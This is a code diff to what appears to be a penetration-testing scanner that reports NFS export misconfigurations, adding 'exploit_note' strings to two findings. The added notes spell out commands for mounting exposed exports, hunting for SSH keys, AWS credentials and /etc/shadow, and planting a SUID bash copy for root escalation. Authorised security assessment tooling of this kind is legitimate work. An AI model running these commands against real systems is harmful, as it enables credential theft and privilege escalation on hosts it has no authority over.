@@ -497,7 +497,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"{shlex.quote(world[0]['dir'])} /mnt/x   # then read/plant files (within ROE)",
                 "Restrict every export to specific hosts/subnets, enable root_squash, "
                 "and export read-only where possible.",
-                ["CWE-284", "CWE-732"], kind="nfs_world"))
+                ["CWE-284", "CWE-732"], kind="nfs_world",
+                exploit_note=(
+                    "mkdir -p /mnt/nfs && mount -t nfs -o vers=3,nolock "
+                    f"{h.ip}:/<export> /mnt/nfs && ls -laR /mnt/nfs | head -200; "
+                    "look for id_rsa, .aws/credentials, /etc/shadow. If "
+                    "no_root_squash: cp /bin/bash /mnt/nfs/.bash && chmod +s "
+                    "/mnt/nfs/.bash for SUID escalation."),
+                depth_tier="t1"))
         if exports:
             dirs = ", ".join(e["dir"] for e in exports[:12])
             out.append(_finding(
@@ -536,7 +543,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 f"{shlex.quote(opened[0]['dir'])} /mnt/x ; ls -la /mnt/x",
                 "Restrict the export's client ACL, enable root_squash, and "
                 "export read-only where possible.",
-                ["CWE-284", "CWE-732"], kind="nfs_mnt_open"))
+                ["CWE-284", "CWE-732"], kind="nfs_mnt_open",
+                exploit_note=(
+                    f"mount -o vers=3,nolock,soft {h.ip}:/<export> /mnt/x; "
+                    "find /mnt/x -maxdepth 3 -name id_rsa -o -name "
+                    "authorized_keys -o -name shadow 2>/dev/null; stat "
+                    "/mnt/x/etc  # if uid 0 = root_squash off"),
+                depth_tier="t2"))
         # G6 nfs_mount_clients: showmount -a client list disclosure.
         clients = pr.get("mount_clients") or []
         if clients:
